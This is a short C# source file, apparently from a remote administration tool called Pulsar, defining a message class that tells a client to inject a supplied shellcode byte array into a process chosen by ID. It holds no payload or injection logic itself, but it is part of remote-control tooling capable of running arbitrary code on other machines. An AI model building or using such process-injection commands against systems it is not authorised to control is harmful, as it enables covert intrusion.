using MessagePack;
using Pulsar.Common.Messages.Other;

namespace Pulsar.Common.Messages.Administration.TaskManager
{
    [MessagePackObject]
    public class DoInjectShellcodeIntoProcess : IMessage
    {
        [Key(1)]
        public int ProcessId { get; set; }

        [Key(2)]
        public byte[] Shellcode { get; set; }
    }
}